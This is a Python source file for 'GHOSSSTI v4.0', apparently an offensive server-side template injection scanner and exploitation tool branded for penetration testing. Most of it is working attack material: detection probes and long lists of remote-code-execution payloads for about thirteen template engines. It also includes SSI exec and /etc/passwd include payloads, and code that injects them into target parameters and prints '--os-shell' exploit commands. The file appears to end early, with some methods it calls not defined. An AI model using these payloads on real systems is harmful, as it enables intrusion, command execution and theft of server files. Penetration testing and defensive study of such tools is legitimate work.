#!/usr/bin/env python3
"""
GHOSSSTI v4.0 - Ghost Ops Server-Side Template Injection Tool
Unified tool with scanner and exploitation modes

Detects: SSTI, SSI, XSLT Injection
Exploits: 13+ template engines, SSI, XSLT

For Ghost Ops Security - Professional Penetration Testing
"""

import requests
import argparse
import sys
import urllib.parse
import re
from typing import Dict, List, Tuple, Optional
from colorama import Fore, Style, init
from urllib.parse import urlparse, parse_qs

init(autoreset=True)

class GhossSSTI:
    def __init__(self, url: str, parameter: str = None, method: str = "GET", 
                 data: Dict = None, headers: Dict = None, cookies: Dict = None,
                 proxy: str = None, timeout: int = 15, 
                 trigger_url: str = None, trigger_method: str = "GET",
                 trigger_data: Dict = None, scan_mode: bool = False,
                 ssi_mode: bool = False, xslt_mode: bool = False,
                 injection_point: str = None):
        self.url = url
        self.parameter = parameter
        self.method = method.upper()
        self.data = data or {}
        self.headers = headers or {"User-Agent": "GHOSSTTI/4.0"}
        self.cookies = cookies or {}
        self.proxy = {"http": proxy, "https": proxy} if proxy else None
        self.timeout = timeout
        self.session = requests.Session()
        self.detected_engine = None
        self.vulnerable_param = None
        self.baseline_response = None
        self.capabilities = {}
        self.os_type = None
        self.scan_mode = scan_mode
        self.ssi_mode = ssi_mode
        self.xslt_mode = xslt_mode
        self.injection_point = injection_point  # Custom injection point
        self.working_payload_template = None  # Store working RCE payload template
        self.last_payload = None  # Store last used payload for display
        self.last_payload = None  # Store last successful payload for display
        self.found_vulnerabilities = []
        
        # Two-endpoint support
        self.trigger_url = trigger_url
        self.trigger_method = trigger_method.upper() if trigger_method else "GET"
        self.trigger_data = trigger_data or {}
        
        # SSTI Detection payloads
        self.engine_tests = {
            "Twig": [
                ("{{7*7}}", "49", "not"),
                ("{{7*'7'}}", "49", "not"),
                ("{{7+'7'}}", "14", "not"),
                ("{{_self}}", "Twig", "partial"),
                ("{{['test']|first}}", "test", "not"),
                ("{{['a','b','c']|length}}", "3", "not"),
                ("{{'test'|upper}}", "TEST", "not"),
                ("{{['a','b']|join}}", "ab", "not"),
                ("{{['a','b']|join(',')}}", "a,b", "not"),
                ("{{['x','y','z']|last}}", "z", "not"),
            ],
            "Jinja2": [
                ("{{7*7}}", "49", "not"),
                ("{{7*'7'}}", "7777777", "not"),
                ("{{config}}", "Config", "partial"),
                ("{{7+'7'}}", "77", "not"),
                ("{{'test'|upper}}", "TEST", "not"),
                ("{{['a','b','c']|length}}", "3", "not"),
            ],
            "Smarty": [
                ("{$smarty.version}", "Smarty", "partial"),
                ("{7*7}", "49", "not"),
                ("{$smarty.now}", "1", "partial"),
                ("{math equation='7*7'}", "49", "not"),
                ("{if 7>5}yes{/if}", "yes", "not"),
            ],
            "Freemarker": [
                ("${7*7}", "49", "not"),
                ("${.now}", "202", "partial"),
                ("${'test'?upper_case}", "TEST", "not"),
                ("${7+7}", "14", "not"),
                ("${'a'+'b'}", "ab", "not"),
                ("${7-3}", "4", "not"),
                ("${'hello'?length}", "5", "not"),
                ("${.version}", "FreeMarker", "partial"),
            ],
            "Velocity": [
                ("#set($x=7*7)$x", "49", "not"),
                ("#set($x=7)$x$x", "77", "not"),
                ("#set($x='test')$x.toUpperCase()", "TEST", "not"),
                ("#set($x=7)#set($y=7)$x$y", "77", "not"),
            ],
            "Mako": [
                ("${7*7}", "49", "not"),
                ("${'test'.upper()}", "TEST", "not"),
                ("${7+7}", "14", "not"),
            ],
            "Pug": [
                ("#{7*7}", "49", "not"),
                ("#{7+7}", "14", "not"),
            ],
            "ERB": [
                ("<%= 7*7 %>", "49", "not"),
                ("<%= 'test'.upcase %>", "TEST", "not"),
                ("<%= 7+7 %>", "14", "not"),
            ],
            "Tornado": [
                ("{{7*7}}", "49", "not"),
                ("{{7+7}}", "14", "not"),
            ],
            "Django": [
                ("{{7|add:7}}", "14", "not"),
                ("{{7|add:'7'}}", "77", "not"),
                ("{{'test'|upper}}", "TEST", "not"),
            ],
            "Handlebars": [
                ("{{7*7}}", "49", "not"),
            ],
            "Thymeleaf": [
                ("${7*7}", "49", "not"),
                ("${7+7}", "14", "not"),
            ],
            "Nunjucks": [
                ("{{7*7}}", "49", "not"),
                ("{{7+7}}", "14", "not"),
            ],
        }
        
        # SSI Detection payloads
        self.ssi_tests = {
            "Environment Variables": [
                ("<!--#printenv -->", r"(PATH|HOME|USER|SERVER_SOFTWARE)", "SSI"),
                ("<!--#echo var=\"DATE_LOCAL\" -->", r"\d{2}:\d{2}:\d{2}", "SSI"),
                ("<!--#echo var=\"DOCUMENT_NAME\" -->", r"\.shtml", "SSI"),
            ],
            "Command Execution": [
                ("<!--#exec cmd=\"id\" -->", r"uid=\d+", "SSI"),
                ("<!--#exec cmd=\"echo VULNERABLE_SSI\" -->", "VULNERABLE_SSI", "SSI"),
                ("<!--#exec cmd=\"whoami\" -->", r"(root|www-data|nginx|apache)", "SSI"),
            ],
            "File Include": [
                ("<!--#include virtual=\"/etc/passwd\" -->", "root:", "SSI"),
                ("<!--#include file=\"/etc/passwd\" -->", "root:", "SSI"),
            ]
        }
        
        # XSLT Detection payloads
        self.xslt_tests = {
            "Version Detection": [
                ("<xsl:value-of select=\"system-property('xsl:version')\"/>", r"[12]\.[0-9]", "XSLT"),
                ("<xsl:value-of select=\"system-property('xsl:vendor')\"/>", r"(Apache|Saxon|Xalan)", "XSLT"),
            ],
        }
        
        # RCE payloads - Comprehensive for all engines
        self.rce_payloads = {
            "Twig": [
                # Filter method (most reliable)
                "{{['{CMD}']|filter('system')}}",
                "{{['{CMD}']|filter('passthru')}}",
                "{{['{CMD}']|filter('exec')}}",
                "{{['{CMD}']|filter('shell_exec')}}",
                # Map method
                "{{['{CMD}']|map('system')|join}}",
                "{{['{CMD}']|map('passthru')|join}}",
                "{{['{CMD}']|map('exec')|join}}",
                "{{['{CMD}']|map('shell_exec')|join}}",
                # Reduce method
                "{{['{CMD}']|reduce((c,v)=>c~(v|filter('system')),'')}}",
                "{{['{CMD}']|reduce((c,v)=>c~(v|filter('passthru')),'')}}",
                # Array sort method
                "{{['{CMD}',0]|sort('system')}}",
                "{{['{CMD}',0]|sort('passthru')}}",
            ],
            "Jinja2": [
                # Lipsum method (most common)
                "{{lipsum.__globals__.os.popen('{CMD}').read()}}",
                "{{lipsum.__globals__['os'].popen('{CMD}').read()}}",
                # Config method
                "{{config.__class__.__init__.__globals__['os'].popen('{CMD}').read()}}",
                "{{config.__class__.__init__.__globals__.os.popen('{CMD}').read()}}",
                # Cycler method
                "{{cycler.__init__.__globals__.os.popen('{CMD}').read()}}",
                "{{cycler.__init__.__globals__['os'].popen('{CMD}').read()}}",
                # Joiner method
                "{{joiner.__init__.__globals__.os.popen('{CMD}').read()}}",
                "{{joiner.__init__.__globals__['os'].popen('{CMD}').read()}}",
                # Namespace method
                "{{namespace.__init__.__globals__.os.popen('{CMD}').read()}}",
                "{{namespace.__init__.__globals__['os'].popen('{CMD}').read()}}",
                # Request method (Flask)
                "{{request.application.__globals__.__builtins__.__import__('os').popen('{CMD}').read()}}",
                "{{request.application.__globals__.__builtins__.open('/etc/passwd').read()}}",
                # Subprocess method
                "{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}",
                # Get_flashed_messages (Flask)
                "{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}",
            ],
            "Freemarker": [
                # Execute utility (most common)
                "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('{CMD}')}",
                "<#assign ex='freemarker.template.utility.Execute'?new()>Exec:${ex('{CMD}')}",
                # ObjectConstructor with Runtime.exec
                "<#assign oc='freemarker.template.utility.ObjectConstructor'?new()><#assign rt=oc('java.lang.Runtime').getRuntime()><#assign proc=rt.exec('{CMD}')>${proc}",
                # JythonRuntime (if Jython available)
                "<#assign ex='freemarker.template.utility.JythonRuntime'?new()><#assign os=ex.getModule('os')>${os.system('{CMD}')}",
                # Multiple ObjectConstructor methods
                "<#assign oc='freemarker.template.utility.ObjectConstructor'?new()><#assign rt=oc('java.lang.Runtime')><#assign exec=rt.getRuntime().exec('{CMD}')>",
                # ProcessBuilder
                "<#assign pb='java.lang.ProcessBuilder'?new('sh','-c','{CMD}')><#assign proc=pb.start()>",
            ],
            "Velocity": [
                # Runtime.exec method 1
                "#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))##\n#set($ex=$rt.getRuntime().exec('{CMD}'))##",
                # Runtime.exec method 2
                "#set($str=$class.inspect('java.lang.String').type)\n#set($chr=$class.inspect('java.lang.Character').type)\n#set($ex=$class.inspect('java.lang.Runtime').type.getRuntime().exec('{CMD}'))",
                # ProcessBuilder
                "#set($pb=$class.inspect('java.lang.ProcessBuilder').type)\n#set($p=$pb.getDeclaredConstructors().get(0).newInstance($arr))\n#set($p=$p.command('sh','-c','{CMD}'))\n#set($p=$p.start())",
                # Class.forName
                "#set($s=''.toString().getClass().forName('java.lang.Runtime').getRuntime().exec('{CMD}'))",
            ],
            "Smarty": [
                # PHP tag (Smarty 2)
                "{php}system('{CMD}');{/php}",
                "{php}echo `{CMD}`;{/php}",
                "{php}passthru('{CMD}');{/php}",
                "{php}shell_exec('{CMD}');{/php}",
                # Function calling (Smarty 3)
                "{system('{CMD}')}",
                "{exec('{CMD}')}",
                "{passthru('{CMD}')}",
                "{shell_exec('{CMD}')}",
                # Literal with PHP
                "{literal}<?php system('{CMD}'); ?>{/literal}",
                # Self methods
                "{$smarty.template_object->smarty->_getSmartyObj()->smarty->security_policy = null}{system('{CMD}')}",
            ],
            "Mako": [
                # Import os (most common)
                "<%import os%>${os.popen('{CMD}').read()}",
                "<%import os%>${os.system('{CMD}')}",
                # Subprocess
                "<%import subprocess%>${subprocess.check_output('{CMD}',shell=True)}",
                "<%import subprocess%>${subprocess.Popen('{CMD}',shell=True,stdout=subprocess.PIPE).communicate()[0]}",
                # Exec
                "<%!import os%>${os.popen('{CMD}').read()}",
                "<%!import os%>${os.system('{CMD}')}",
                # Direct exec
                "<%exec(\"import os;os.popen('{CMD}').read()\")%>",
            ],
            "Pug": [
                # Buffered code
                "#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad('child_process').exec('{CMD}')}()}",
                "#{global.process.mainModule.require('child_process').exec('{CMD}')}",
                "#{process.mainModule.require('child_process').execSync('{CMD}').toString()}",
                # Unbuffered code
                "- var x=global.process.mainModule.require('child_process').execSync('{CMD}').toString()\n=x",
                # Direct require
                "#{require('child_process').exec('{CMD}')}",
                "#{require('child_process').execSync('{CMD}').toString()}",
            ],
            "ERB": [
                # Backticks (most common)
                "<%= `{CMD}` %>",
                # System call
                "<%= system('{CMD}') %>",
                "<%= exec('{CMD}') %>",
                # Open3
                "<%= require 'open3'; Open3.capture2('{CMD}')[0] %>",
                # IO.popen
                "<%= IO.popen('{CMD}').read %>",
                # %x notation
                "<%= %x[{CMD}] %>",
                # Kernel.system
                "<%= Kernel.system('{CMD}') %>",
            ],
            "Django": [
                # Debug trick (if debug=True)
                "{{request.META.items}}",
                # Load tag abuse
                "{% load log %}{% get_logger 'os' as os %}{{os.system('{CMD}')}}",
                # Custom template tags (if available)
                "{% load custom %}{% system '{CMD}' %}",
                # Exec via debug
                "{% debug %}",
            ],
            "Tornado": [
                # Handler methods
                "{{handler.settings}}",
                "{{handler.application.settings}}",
                # Import trick
                "{% import os %}{{os.popen('{CMD}').read()}}",
                "{% import subprocess %}{{subprocess.check_output('{CMD}',shell=True)}}",
            ],
            "Handlebars": [
                # Prototype pollution to RCE (Node.js)
                "{{#with 'constructor'}}{{#with split as |a|}}{{pop (push 'return process.mainModule.require(\"child_process\").execSync(\"{CMD}\");')}}{{#each (a 0 1)}}{{}}{{/each}}{{/with}}{{/with}}",
                # Lookup helper
                "{{lookup (__lookupGetter__ 'constructor') 'constructor' 'return process.mainModule.require(\"child_process\").execSync(\"{CMD}\");'}}",
            ],
            "Thymeleaf": [
                # SpringEL injection
                "${T(java.lang.Runtime).getRuntime().exec('{CMD}')}",
                "*{T(java.lang.Runtime).getRuntime().exec('{CMD}')}",
                # ProcessBuilder
                "${T(java.lang.ProcessBuilder).start(new String[]{'/bin/sh','-c','{CMD}'})}",
                # Alternative methods
                "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('{CMD}').getInputStream())}",
            ],
            "Nunjucks": [
                # Range constructor
                "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('{CMD}')\")()\n}}",
                # Global access
                "{{constructor.constructor('return process.mainModule.require(\"child_process\").execSync(\"{CMD}\")')()}}",
                # Direct require
                "{{process.mainModule.require('child_process').execSync('{CMD}').toString()}}",
            ],
            "SSI": [
                "<!--#exec cmd=\"{CMD}\" -->",
            ],
        }

    def print_banner(self):
        if self.scan_mode:
            banner = f"""
{Fore.CYAN}╔═══════════════════════════════════════════════════════════════════════════╗
{Fore.CYAN}║             {Fore.WHITE}👻 GHOSSSTI v4.0 - SCANNER MODE 👻{Fore.CYAN}                        ║
{Fore.CYAN}║        {Fore.YELLOW}Ghost Ops Comprehensive Injection Scanner{Fore.CYAN}                    ║
{Fore.CYAN}╚═══════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.GREEN}  ╔════════════════════════════════════════════════════════════════════════╗
{Fore.GREEN}  ║  {Fore.WHITE}Detects: SSTI • SSI • XSLT Injection{Fore.GREEN}                             ║
{Fore.GREEN}  ║  {Fore.CYAN}Auto-Discovery • Smart Detection • Exploit Commands{Fore.GREEN}             ║
{Fore.GREEN}  ╚════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
            """
        else:
            banner = f"""
{Fore.CYAN}               ╔══════════════════════════════════════════════╗
{Fore.CYAN}               ║             {Fore.WHITE}👻 GHOSSSTI v4.0 👻{Fore.CYAN}                   ║
{Fore.CYAN}               ║  {Fore.YELLOW}Ghost Ops Server-Side Injection Tool{Fore.CYAN}        ║
{Fore.CYAN}               ╚══════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.RED}    ██████{Fore.WHITE}╗ {Fore.RED}██{Fore.WHITE}╗  {Fore.RED}██{Fore.WHITE}╗ {Fore.RED}██████{Fore.WHITE}╗ {Fore.RED}███████{Fore.WHITE}╗{Fore.RED}███████{Fore.WHITE}╗{Fore.YELLOW}███████{Fore.WHITE}╗{Fore.YELLOW}████████{Fore.WHITE}╗{Fore.YELLOW}██{Fore.WHITE}╗
{Fore.RED}   ██{Fore.WHITE}╔════╝ {Fore.RED}██{Fore.WHITE}║  {Fore.RED}██{Fore.WHITE}║{Fore.RED}██{Fore.WHITE}╔═══{Fore.RED}██{Fore.WHITE}╗{Fore.RED}██{Fore.WHITE}╔════╝{Fore.RED}██{Fore.WHITE}╔════╝{Fore.YELLOW}██{Fore.WHITE}╔════╝╚══{Fore.YELLOW}██{Fore.WHITE}╔══╝{Fore.YELLOW}██{Fore.WHITE}║
{Fore.RED}   ██{Fore.WHITE}║  {Fore.RED}███{Fore.RED}███████{Fore.WHITE}║{Fore.RED}██{Fore.WHITE}║   {Fore.RED}██{Fore.WHITE}║{Fore.RED}███████{Fore.WHITE}╗{Fore.RED}███████{Fore.WHITE}╗{Fore.YELLOW}███████{Fore.WHITE}╗   {Fore.YELLOW}██{Fore.WHITE}║   {Fore.YELLOW}██{Fore.WHITE}║
{Fore.RED}   ██{Fore.WHITE}║   {Fore.RED}██{Fore.RED}██{Fore.WHITE}╔══{Fore.RED}██{Fore.WHITE}║{Fore.RED}██{Fore.WHITE}║   {Fore.RED}██{Fore.WHITE}║╚════{Fore.RED}██{Fore.WHITE}║╚════{Fore.RED}██{Fore.WHITE}║╚════{Fore.YELLOW}██{Fore.WHITE}║   {Fore.YELLOW}██{Fore.WHITE}║   {Fore.YELLOW}██{Fore.WHITE}║
{Fore.RED}   ╚██████{Fore.WHITE}╔╝{Fore.RED}██{Fore.WHITE}║  {Fore.RED}██{Fore.WHITE}║╚{Fore.RED}██████{Fore.WHITE}╔╝{Fore.RED}███████{Fore.WHITE}║{Fore.RED}███████{Fore.WHITE}║{Fore.YELLOW}███████{Fore.WHITE}║   {Fore.YELLOW}██{Fore.WHITE}║   {Fore.YELLOW}██{Fore.WHITE}║
{Fore.RED}    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝{Fore.YELLOW}╚══════╝   ╚═╝   ╚═╝{Style.RESET_ALL}

{Fore.GREEN}       ╔════════════════════════════════════════════════════════════╗
{Fore.GREEN}       ║  {Fore.CYAN}Unified Tool: Scanner + Exploitation{Fore.GREEN}                    ║
{Fore.GREEN}       ║  {Fore.WHITE}SSTI • SSI • XSLT {Fore.CYAN}•{Fore.WHITE} 13+ Engines {Fore.CYAN}•{Fore.WHITE} Two-Endpoint{Fore.GREEN}      ║
{Fore.GREEN}       ╠════════════════════════════════════════════════════════════╣
{Fore.GREEN}       ║  {Fore.YELLOW}✓ v4.0 Unified  {Fore.WHITE}|  {Fore.RED}✓ Production Ready{Fore.GREEN}             ║
{Fore.GREEN}       ║  {Fore.MAGENTA}Ghost Ops Security - Professional Penetration Testing{Fore.GREEN} ║
{Fore.GREEN}       ╚════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
            """
        print(banner)

    # ==================== SCANNER MODE ====================
    
    def discover_parameters(self) -> List[Tuple[str, str, str]]:
        """Discover all testable parameters"""
        if not self.scan_mode:
            return []
        
        print(f"\n{Fore.YELLOW}[*] Discovering parameters...{Style.RESET_ALL}")
        params = []
        parsed = urlparse(self.url)
        
        # GET parameters from URL
        if parsed.query:
            get_params = parse_qs(parsed.query)
            for param in get_params.keys():
                params.append((param, "GET", self.url))
                print(f"  {Fore.CYAN}[+] Found GET parameter: {param}{Style.RESET_ALL}")
        
        # POST parameters from -d flag (command line data)
        if self.data:
            for param, value in self.data.items():
                params.append((param, "POST", self.url))
                print(f"  {Fore.CYAN}[+] Found POST parameter: {param}{Style.RESET_ALL}")
                
                # Auto-detect injection point marker
                if '*INJECT*' in str(value) or '*inject*' in str(value):
                    self.injection_point = True
                    print(f"  {Fore.GREEN}[+] Detected injection point marker in {param}{Style.RESET_ALL}")
        
        # POST parameters from forms (only if no data provided)
        if not self.data:
            try:
                response = self.session.get(
                    self.url,
                    headers=self.headers,
                    cookies=self.cookies,
                    proxies=self.proxy,
                    timeout=self.timeout,
                    verify=False
                )
                
                # Look for form inputs
                form_params = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', response.text, re.IGNORECASE)
                form_params += re.findall(r'<textarea[^>]+name=["\']([^"\']+)["\']', response.text, re.IGNORECASE)
                
                for param in set(form_params):  # Use set to avoid duplicates
                    params.append((param, "POST", self.url))
                    print(f"  {Fore.CYAN}[+] Found POST parameter in form: {param}{Style.RESET_ALL}")
            
            except Exception as e:
                print(f"  {Fore.YELLOW}[!] Could not fetch page for form discovery: {e}{Style.RESET_ALL}")
        
        if not params:
            print(f"  {Fore.RED}[!] No parameters found. Use -d for POST data or add ?param=value to URL{Style.RESET_ALL}")
        
        return params

    def test_parameter_scan(self, param: str, method: str, test_url: str, 
                           payload: str, expected: str, vuln_type: str) -> bool:
        """Test parameter in scan mode"""
        try:
            if method == "GET":
                test_url_with_param = f"{test_url}{'&' if '?' in test_url else '?'}{param}={urllib.parse.quote(payload)}"
                response = self.session.get(
                    test_url_with_param,
                    headers=self.headers,
                    cookies=self.cookies,
                    proxies=self.proxy,
                    timeout=self.timeout,
                    verify=False
                )
            else:  # POST
                # Use existing POST data and replace the parameter value
                post_data = self.data.copy() if self.data else {}
                post_data[param] = payload
                response = self.session.post(
                    test_url,
                    data=post_data,
                    headers=self.headers,
                    cookies=self.cookies,
                    proxies=self.proxy,
                    timeout=self.timeout,
                    verify=False
                )
            
            # Check if expected pattern is in response
            if re.search(expected, response.text, re.IGNORECASE):
                # CRITICAL: Make sure payload is not just echoed back
                # If payload appears in response unchanged, it's likely a false positive
                clean_payload = urllib.parse.unquote(payload).lower()
                response_lower = response.text.lower()
                
                # For short payloads (like "test"), require exact match not found
                if len(payload) < 15:
                    if clean_payload in response_lower:
                        # Payload is echoed, likely false positive
                        return False
                
                # For longer payloads, check if they're just reflected
                if len(payload) > 15 and clean_payload in response_lower:
                    # Count how many times it appears
                    count = response_lower.count(clean_payload)
                    if count > 0:
                        # It's being reflected, not executed
                        return False
                
                # Passed checks, likely vulnerable
                return True
            
            return False
        except Exception as e:
            return False

    def scan_all_vulnerabilities(self):
        """Scan for all vulnerability types"""
        params = self.discover_parameters()
        
        if not params:
            print(f"{Fore.RED}[!] No parameters found to test{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.GREEN}[+] Found {len(params)} parameter(s) to test{Style.RESET_ALL}")
        
        # Scan SSTI
        print(f"\n{Fore.CYAN}[*] Scanning for Server-Side Template Injection (SSTI)...{Style.RESET_ALL}")
        for param, method, url in params:
            print(f"  {Fore.WHITE}Testing parameter: {param} ({method}){Style.RESET_ALL}")
            for engine, tests in self.engine_tests.items():
                for payload, expected, check_type in tests:
                    if self.test_parameter_scan(param, method, url, payload, expected, "SSTI"):
                        vuln = {
                            'type': 'SSTI',
                            'param': param,
                            'method': method,
                            'url': url,
                            'payload': payload,
                            'engine_hint': engine,
                        }
                        self.found_vulnerabilities.append(vuln)
                        print(f"    {Fore.GREEN}[✓] SSTI FOUND: {engine} - {payload[:50]}{Style.RESET_ALL}")
                        break
                if any(v['param'] == param and v['type'] == 'SSTI' for v in self.found_vulnerabilities):
                    break
        
        # Scan SSI
        print(f"\n{Fore.CYAN}[*] Scanning for Server-Side Includes (SSI)...{Style.RESET_ALL}")
        for param, method, url in params:
            print(f"  {Fore.WHITE}Testing parameter: {param} ({method}){Style.RESET_ALL}")
            for category, tests in self.ssi_tests.items():
                for payload, expected, vuln_type in tests:
                    if self.test_parameter_scan(param, method, url, payload, expected, "SSI"):
                        vuln = {
                            'type': 'SSI',
                            'param': param,
                            'method': method,
                            'url': url,
                            'payload': payload,
                            'category': category
                        }
                        self.found_vulnerabilities.append(vuln)
                        print(f"    {Fore.GREEN}[✓] SSI FOUND: {category} - {payload[:50]}{Style.RESET_ALL}")
                        break
                if any(v['param'] == param and v['type'] == 'SSI' for v in self.found_vulnerabilities):
                    break
        
        # Scan XSLT
        print(f"\n{Fore.CYAN}[*] Scanning for XSLT Injection...{Style.RESET_ALL}")
        for param, method, url in params:
            print(f"  {Fore.WHITE}Testing parameter: {param} ({method}){Style.RESET_ALL}")
            for category, tests in self.xslt_tests.items():
                for payload, expected, vuln_type in tests:
                    if self.test_parameter_scan(param, method, url, payload, expected, "XSLT"):
                        vuln = {
                            'type': 'XSLT',
                            'param': param,
                            'method': method,
                            'url': url,
                            'payload': payload,
                            'category': category
                        }
                        self.found_vulnerabilities.append(vuln)
                        print(f"    {Fore.GREEN}[✓] XSLT FOUND: {category}{Style.RESET_ALL}")
                        break
                if any(v['param'] == param and v['type'] == 'XSLT' for v in self.found_vulnerabilities):
                    break
        
        self.print_scan_results()

    def print_scan_results(self):
        """Print scan results with exploitation commands"""
        print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║                    SCAN RESULTS                               ║")
        print(f"{Fore.CYAN}╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        if not self.found_vulnerabilities:
            print(f"{Fore.YELLOW}[!] No vulnerabilities found{Style.RESET_ALL}")
            return
        
        # Group by type
        ssti_vulns = [v for v in self.found_vulnerabilities if v['type'] == 'SSTI']
        ssi_vulns = [v for v in self.found_vulnerabilities if v['type'] == 'SSI']
        xslt_vulns = [v for v in self.found_vulnerabilities if v['type'] == 'XSLT']
        
        print(f"{Fore.GREEN}[+] Found {len(self.found_vulnerabilities)} vulnerabilities:{Style.RESET_ALL}")
        if ssti_vulns:
            print(f"  {Fore.RED}→ SSTI: {len(ssti_vulns)} vulnerable parameter(s){Style.RESET_ALL}")
        if ssi_vulns:
            print(f"  {Fore.RED}→ SSI: {len(ssi_vulns)} vulnerable parameter(s){Style.RESET_ALL}")
        if xslt_vulns:
            print(f"  {Fore.RED}→ XSLT: {len(xslt_vulns)} vulnerable parameter(s){Style.RESET_ALL}")
        
        # Print details
        print(f"\n{Fore.CYAN}[*] Vulnerability Details:{Style.RESET_ALL}\n")
        for i, vuln in enumerate(self.found_vulnerabilities, 1):
            print(f"{Fore.YELLOW}[{i}] {vuln['type']} Vulnerability{Style.RESET_ALL}")
            print(f"    URL: {vuln['url']}")
            print(f"    Parameter: {vuln['param']}")
            print(f"    Method: {vuln['method']}")
            print(f"    Test Payload: {vuln['payload'][:80]}...")
            if 'engine_hint' in vuln:
                print(f"    Likely Engine: {vuln['engine_hint']}")
            print()
        
        # Print exploitation commands
        print(f"{Fore.CYAN}╔═══════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║              EXPLOITATION COMMANDS                            ║")
        print(f"{Fore.CYAN}╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.GREEN}[+] Use these commands to exploit the vulnerabilities:{Style.RESET_ALL}\n")
        
        for vuln in self.found_vulnerabilities:
            vuln_type = vuln['type']
            param = vuln['param']
            method = vuln['method']
            url = vuln['url']
            
            print(f"{Fore.YELLOW}[→] {vuln_type} - {param} parameter:{Style.RESET_ALL}")
            cmd = f"./ghosssti.py -u \"{url}\" -p \"{param}\""
            
            # Add method if POST
            if method == "POST":
                cmd += f" -m POST"
            
            # Add POST data if available
            if self.data:
                data_str = "&".join([f"{k}={v}" for k, v in self.data.items()])
                cmd += f" -d \"{data_str}\""
                
                # Check if injection point was used
                if self.injection_point or any('*INJECT*' in str(v) or '*inject*' in str(v) for v in self.data.values()):
                    cmd += " --inject-point"
            
            # Add mode flags
            if vuln_type == "SSI":
                cmd += " --ssi-mode"
            elif vuln_type == "XSLT":
                cmd += " --xslt-mode"
            
            cmd += " --os-shell"
            print(f"{Fore.WHITE}{cmd}{Style.RESET_ALL}\n")

    # ==================== EXPLOITATION MODE ====================
    
    def make_request(self, payload: str, param: str = None) -> Optional[str]:
        """Make HTTP request with payload"""
        try:
            if param is None:
                param = self.parameter
            
            payload_encoded = urllib.parse.quote(payload, safe='') if self.method == "GET" else payload
            
            # STEP 1: Inject payload
            if self.method == "GET":
                params = {param: payload_encoded}
                inject_response = self.session.get(
                    self.url,
                    params=params,
                    headers=self.headers,
                    cookies=self.cookies,
                    proxies=self.proxy,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True
                )
            else:
                data = self.data.copy()
                
                # Check if injection point is specified (case-insensitive)
                param_value = str(data.get(param, ''))
                if self.injection_point and ('*INJECT*' in param_value or '*inject*' in param_value):
                    # Replace *INJECT* or *inject* with payload
                    data[param] = param_value.replace('*INJECT*', payload).replace('*inject*', payload)
                else:
                    # Normal: replace entire parameter value
                    data[param] = payload
                
                inject_response = self.session.post(
                    self.url,
                    data=data,
                    headers=self.headers,
                    cookies=self.cookies,
                    proxies=self.proxy,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True
                )
            
            # STEP 2: Trigger if specified
            if self.trigger_url:
                if self.trigger_method == "GET":
                    trigger_response = self.session.get(
                        self.trigger_url,
                        headers=self.headers,
                        cookies=self.cookies,
                        proxies=self.proxy,
                        timeout=self.timeout,
                        verify=False,
                        allow_redirects=True
                    )
                else:
                    trigger_response = self.session.post(
                        self.trigger_url,
                        data=self.trigger_data,
                        headers=self.headers,
                        cookies=self.cookies,
                        proxies=self.proxy,
                        timeout=self.timeout,
                        verify=False,
                        allow_redirects=True
                    )
                return trigger_response.text
            
            return inject_response.text
        except Exception as e:
            return None

    def is_payload_executed(self, response: str, payload: str, expected: str, check_type: str) -> bool:
        """Check if payload executed"""
        if not response:
            return False
        
        response_lower = response.lower()
        expected_lower = expected.lower()
        clean_payload = urllib.parse.unquote(payload).lower()
        
        has_expected = expected_lower in response_lower
        
        if check_type == "not":
            has_payload = clean_payload in response_lower
            if has_payload and len(payload) > 10:
                return False
            return has_expected
        elif check_type == "partial":
            return has_expected
        
        return False

    def detect_ssti(self) -> Tuple[bool, Optional[str], Optional[str]]:
        """SSTI/SSI detection"""
        if self.ssi_mode:
            print(f"\n{Fore.YELLOW}[*] Testing for SSI (Server-Side Includes)...{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.YELLOW}[*] Starting SSTI/SSI detection...{Style.RESET_ALL}")
        
        if self.trigger_url:
            print(f"{Fore.CYAN}[*] Two-endpoint mode:{Style.RESET_ALL}")
            print(f"    Injection URL: {self.url}")
            print(f"    Trigger URL: {self.trigger_url}")
        
        if not self.parameter:
            params = self.find_parameters()
            if not params:
                print(f"{Fore.RED}[!] No parameters found{Style.RESET_ALL}")
                return False, None, None
        else:
            params = [self.parameter]
        
        for param in params:
            print(f"{Fore.CYAN}[*] Testing parameter: {param}{Style.RESET_ALL}")
            
            self.baseline_response = self.make_request("BASELINE_TEST", param)
            if not self.baseline_response:
                continue
            
            # If SSI mode, test SSI payloads specifically
            if self.ssi_mode:
                print(f"{Fore.YELLOW}[*] Running SSI detection tests...{Style.RESET_ALL}\n")
                if self.test_ssi_vulnerability(param):
                    self.vulnerable_param = param
                    self.detected_engine = "SSI"
                    self.detect_ssi_capabilities()
                    return True, "SSI", param
                else:
                    print(f"{Fore.RED}[!] No SSI vulnerability detected{Style.RESET_ALL}")
                    return False, None, None
            
            # Otherwise, normal SSTI detection
            print(f"{Fore.YELLOW}[*] Running comprehensive engine detection...{Style.RESET_ALL}\n")
            
            engine = self.identify_engine_verified(param)
            if engine:
                self.vulnerable_param = param
                self.detected_engine = engine
                self.detect_capabilities()
                return True, engine, param
        
        print(f"{Fore.RED}[!] No SSTI vulnerability detected{Style.RESET_ALL}")
        return False, None, None

